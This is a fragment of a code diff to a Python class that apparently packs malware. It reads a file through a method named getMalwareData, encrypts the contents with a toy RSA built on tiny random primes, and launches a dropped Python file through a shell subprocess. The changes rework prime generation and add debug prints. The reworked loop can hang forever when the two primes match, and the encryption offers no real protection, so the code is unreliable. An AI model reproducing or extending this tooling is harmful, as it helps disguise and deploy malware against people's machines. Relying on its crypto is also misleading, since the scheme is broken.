@@ -47,14 +47,15 @@ class StartModule():
 	def getRandomKeypair(self):
 		prime_a = ''
 		prime_b = ''
-		while prime_a == '':
-			num = random.randint(random.randint(0,40),random.randint(40,80))*random.randint(1,10)
-			if self.__is_prime__(num):
-				prime_a = num
-		while prime_b == '' or prime_a == prime_b:
-			num = random.randint(random.randint(40,80),random.randint(80,120))*random.randint(1,10)
-			if self.__is_prime__(num):
-				prime_b = num
+		while prime_a == prime_b:
+			while prime_a == '':
+				num = random.randint(random.randint(0,40),random.randint(40,80))*random.randint(1,10)
+				if self.__is_prime__(num):
+					prime_a = num
+			while prime_b == '':
+				num = random.randint(random.randint(40,80),random.randint(80,120))*random.randint(1,10)
+				if self.__is_prime__(num):
+					prime_b = num
 		return (prime_a, prime_b)
 
 	def encrypt(self, private_key, plaintext):
@@ -166,6 +167,7 @@ class StartModule():
 	# FIN RSA
 
 	def getMalwareData(self, fileName):
+		print(fileName)
 		file = open(fileName, "rb")
 		file_data = file.read()
 		file.close()
@@ -261,6 +263,7 @@ proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), she
 			prime_a, prime_b = self.getRandomKeypair()
 			public, private = self.generate_keypair(prime_a, prime_b)
 			crypted_data = self.encrypt(private_key=private, plaintext=data.decode("utf-8"))
+			print(crypted_data)
 			new_file = new_file_name
 			if not '.' in new_file:
 				new_file = '{file}.py'.format(file=new_file)
